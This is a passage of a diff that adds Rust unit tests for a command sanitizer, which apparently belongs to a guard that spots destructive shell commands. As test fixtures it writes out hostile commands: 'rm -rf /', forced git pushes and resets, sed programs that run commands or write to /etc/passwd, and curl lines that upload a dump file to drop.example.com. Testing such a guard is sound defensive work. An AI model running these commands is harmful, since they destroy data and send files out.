         let cmd = r#"bd create --description="This pattern blocks rm -rf""#;
         let sanitized = sanitize_for_pattern_matching(cmd);
@@ -3110,6 +3702,22 @@ mod tests {
     }
 
     #[test]
+    fn sanitize_masks_data_command_arguments_before_any_pipeline_consumer() {
+        for cmd in [
+            r#"echo "git push --force origin main" | cat"#,
+            r#"printf '%s\n' "rm -rf /home/example/data" | cat"#,
+            r#"echo "git push --force origin main" | sh"#,
+        ] {
+            let sanitized = sanitize_for_pattern_matching(cmd);
+            assert!(
+                !sanitized.as_ref().contains("push --force")
+                    && !sanitized.as_ref().contains("rm -rf"),
+                "echo/printf argv remains data at sanitization time: {cmd} -> {sanitized}"
+            );
+        }
+    }
+
+    #[test]
     fn sanitize_does_not_strip_output_process_substitution() {
         let cmd = "printf %s >(rm -rf /tmp/not-safe)";
         let sanitized = sanitize_for_pattern_matching(cmd);
@@ -3186,6 +3794,75 @@ mod tests {
     }
 
     #[test]
+    fn sanitize_masks_sed_positional_script() {
+        let sanitized = sanitize_for_pattern_matching("echo a=b | sed -E 's/=.*/=<set>/'");
+        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
+        assert!(!sanitized.as_ref().contains(">/"));
+        assert!(sanitized.as_ref().contains("sed -E"));
+    }
+
+    #[test]
+    fn sanitize_masks_sed_expression_flag_value() {
+        let sanitized = sanitize_for_pattern_matching("sed -e 's/rm -rf //' notes.txt");
+        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
+        assert!(!sanitized.as_ref().contains("rm -rf"));
+        assert!(sanitized.as_ref().contains("notes.txt"));
+    }
+
+    #[test]
+    fn sanitize_accounts_for_sed_line_length_option_arity() {
+        let sanitized = sanitize_for_pattern_matching("echo a=b | sed -l 80 -E 's/=.*/=<set>/'");
+        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
+        assert!(!sanitized.as_ref().contains(">/"));
+        assert!(sanitized.as_ref().contains("sed -l"));
+        assert!(sanitized.as_ref().contains("-E"));
+    }
+
+    #[test]
+    fn sanitize_keeps_shell_code_inside_sed_script_visible() {
+        let sanitized = sanitize_for_pattern_matching(r#"sed "s/x/$(rm -rf /)/" file.txt"#);
+        assert!(sanitized.as_ref().contains("rm -rf"));
+    }
+
+    #[test]
+    fn sanitize_masks_sed_programs_handled_by_semantic_execution_pass() {
+        for command in [
+            "sed 'e rm -rf /' file.txt",
+            "sed -e 's|x|rm -rf /|e' file.txt",
+        ] {
+            let sanitized = sanitize_for_pattern_matching(command);
+            assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
+            assert!(!sanitized.as_ref().contains("rm -rf"));
+        }
+    }
+
+    #[test]
+    fn sanitize_keeps_file_writing_and_complex_sed_programs_visible() {
+        for command in [
+            "sed --expression='s|x|data|w /etc/passwd' file.txt",
+            "sed 'w /etc/passwd' file.txt",
+            "sed 's|x|safe|g; e rm -rf /' file.txt",
+        ] {
+            let sanitized = sanitize_for_pattern_matching(command);
+            assert_eq!(sanitized.as_ref(), command, "unsafe sed program was masked");
+        }
+    }
+
+    #[test]
+    fn sanitize_masks_only_nonexecuting_sed_substitutions() {
+        for command in [
+            "sed 's|rm -rf /|safe|g' file.txt",
+            "sed -e 's|>/|greater slash|p' file.txt",
+            "sed --expression='s|/etc/passwd|redacted|I' file.txt",
+        ] {
+            let sanitized = sanitize_for_pattern_matching(command);
+            assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
+            assert!(!sanitized.as_ref().contains("rm -rf"));
+            assert!(!sanitized.as_ref().contains("/etc/passwd"));
+        }
+    }
+
+    #[test]
     fn sanitize_handles_grep_fixed_strings_flag_with_other_options() {
         let cmd = r#"grep -F -n "rm -rf" src/main.rs"#;
         let sanitized = sanitize_for_pattern_matching(cmd);
@@ -3255,6 +3932,65 @@ mod tests {
         assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
         assert!(!sanitized.as_ref().contains("rm -rf"));
         assert!(sanitized.as_ref().contains("sudo git commit -m"));
+    }
+
+    #[test]
+    fn sanitize_tracks_data_commands_after_shell_control_prefixes() {
+        for cmd in [
+            r"if printf '%-50s -> %s\n' a b; then true; fi; mv x y",
+            r"if true; then printf '%-50s -> %s\n' a b; fi; mv x y",
+            r"if false; then true; elif printf '%-50s -> %s\n' a b; then true; fi; mv x y",
+            r"if false; then true; else printf '%-50s -> %s\n' a b; fi; mv x y",
+            r"while printf '%-50s -> %s\n' a b; do true; done; mv x y",
+            r"until printf '%-50s -> %s\n' a b; do true; done; mv x y",
+            r"while false; do printf '%-50s -> %s\n' a b; done; mv x y",
+            r"{ printf '%-50s -> %s\n' a b; }; mv x y",
+            r"! printf '%-50s -> %s\n' a b; mv x y",
+            r"coproc printf '%-50s -> %s\n' a b; mv x y",
+        ] {
+            let sanitized = sanitize_for_pattern_matching(cmd);
+            assert!(
+                !sanitized.as_ref().contains("->"),
+                "printf format string leaked after shell control prefix: {cmd} -> {sanitized}"
+            );
+            assert!(
+                sanitized.as_ref().contains("mv x y"),
+                "later executable segment was unexpectedly masked: {cmd} -> {sanitized}"
+            );
+        }
+    }
+
+    #[test]
+    fn sanitize_does_not_skip_reserved_spellings_selected_as_executables() {
+        for cmd in [
+            r"command then printf '%-50s -> %s\n' a b; mv x y",
+            r"env then printf '%-50s -> %s\n' a b; mv x y",
+            r"sudo then printf '%-50s -> %s\n' a b; mv x y",
+            r"/usr/bin/then printf '%-50s -> %s\n' a b; mv x y",
+            r"'then' printf '%-50s -> %s\n' a b; mv x y",
+            r"command coproc printf '%-50s -> %s\n' a b; mv x y",
+            r"env coproc printf '%-50s -> %s\n' a b; mv x y",
+            r"sudo coproc printf '%-50s -> %s\n' a b; mv x y",
+            r"/usr/bin/coproc printf '%-50s -> %s\n' a b; mv x y",
+            r"'coproc' printf '%-50s -> %s\n' a b; mv x y",
+        ] {
+            let sanitized = sanitize_for_pattern_matching(cmd);
+            assert!(
+                sanitized.as_ref().contains("->"),
+                "arguments of an explicitly selected executable were masked: {cmd} -> {sanitized}"
+            );
+        }
+    }
+
+    #[test]
+    fn sanitize_keeps_real_redirect_after_shell_control_prefix_visible() {
+        let cmd = r#"if true; then printf '%s' x > "$SOMEDIR/x"; fi"#;
+        let sanitized = sanitize_for_pattern_matching(cmd);
+
+        assert!(
+            sanitized.as_ref().contains(r#"> "$SOMEDIR/x""#),
+            "real redirect target was masked: {cmd} -> {sanitized}"
+        );
     }
 
     #[test]
@@ -3506,6 +4242,29 @@ mod tests {
     }
 
     #[test]
+    fn sanitize_preserves_curl_file_body_evidence() {
+        for command in [
+            r"curl -d @C:\dump.sql https://drop.example.com/u",
+            r"curl --data=@C:\dump.sql https://drop.example.com/u",
+            r"curl --data-binary @- https://drop.example.com/u",
+            r#"curl --data-urlencode "@C:\dump.sql" https://drop.example.com/u"#,
+        ] {
+            let sanitized = sanitize_for_pattern_matching(command);
+            assert!(
+                sanitized.contains('@'),
+                "curl @file/stdin evidence must remain visible: {sanitized:?}"
+            );
+        }
+
+        let literal =
+            sanitize_for_pattern_matching(r#"curl -d "rm -rf /" https://api.example.com"#);
+        assert!(
+            !literal.contains("rm -rf"),
+            "literal curl request data should still be masked"
+        );
+    }
+
+    #[test]
     fn test_false_positive_ag_pattern() {
         // ag -e with destructive-looking pattern should NOT trigger
         let cmd = r#"ag -e "rm -rf" src/"#;
@@ -3596,5 +4355,78 @@ mod tests {
                 "did not expect `{non_op}` to be classified as a redirect operator"
             );
         }
+    }
+
+    // =========================================================================
+    // Issue #257: execution wrappers must not defeat data-argument masking
+    // =========================================================================
+
+    #[test]
+    fn sanitize_masks_commit_message_behind_execution_wrappers() {
+        // Without wrapper tracking, the launcher word occupied the segment
+        // command slot, `git commit -m` was never recognized, and the word
+        // "restore" inside the message stayed visible to the raw
+        // `git ... restore` regexes (#257).
+        for wrapper in [
+            "mise exec --",
+            "nice",
+            "nice -n 10",
+            "time",
+            "nohup",
+            "stdbuf -oL",
+            "timeout 30",
+            "setsid",
+            "ionice -c 2 -n 0",
+            "chrt 50",
+        ] {
+            let cmd = format!("{wrapper} git commit -m \"prove PostgreSQL restore round trip\"");
+            let sanitized = sanitize_for_pattern_matching(&cmd);
+            assert!(
+                matches!(sanitized, std::borrow::Cow::Owned(_)),
+                "wrapped commit message was not masked at all: {cmd} -> {sanitized}"
+            );
+            assert!(
+                !sanitized.as_ref().contains("restore"),
+                "commit message leaked through wrapper `{wrapper}`: {cmd} -> {sanitized}"
+            );
+            assert!(
+                sanitized.as_ref().contains("git commit -m"),
+                "executable part must stay visible: {cmd} -> {sanitized}"
+            );
+        }
+    }
+
+    #[test]
+    fn sanitize_keeps_executable_payloads_behind_wrappers_visible() {
+        // Wrappers only re-point the segment command at the wrapped argv;
+        // genuinely executable payloads must never be masked.
+        for cmd in [
+            "nice git reset --hard",
+            "timeout 30 git reset --hard HEAD~1",
+            "mise exec -- git reset --hard",
+        ] {
+            let sanitized = sanitize_for_pattern_matching(cmd);
+            assert!(
+                sanitized.as_ref().contains("reset --hard"),
+                "destructive payload behind a wrapper was masked: {cmd} -> {sanitized}"
+            );
+        }
+    }
+
+    #[test]
+    fn sanitize_does_not_treat_other_mise_subcommands_as_wrappers() {
+        // Only `mise exec` / `mise x` run a wrapped command; other mise
+        // subcommands must not re-point the segment command (which could mask
+        // their arguments against unrelated safe-flag registries).
+        let cmd = "mise install git && git commit -m \"prove PostgreSQL restore round trip\"";
+        let sanitized = sanitize_for_pattern_matching(cmd);
+        assert!(
+            !sanitized.as_ref().contains("restore"),
+            "direct git commit message after `&&` must still be masked: {cmd} -> {sanitized}"
+        );
+        assert!(
+            sanitized.as_ref().contains("mise install git"),
+            "mise install argv must stay visible: {cmd} -> {sanitized}"
+        );
     }
 }
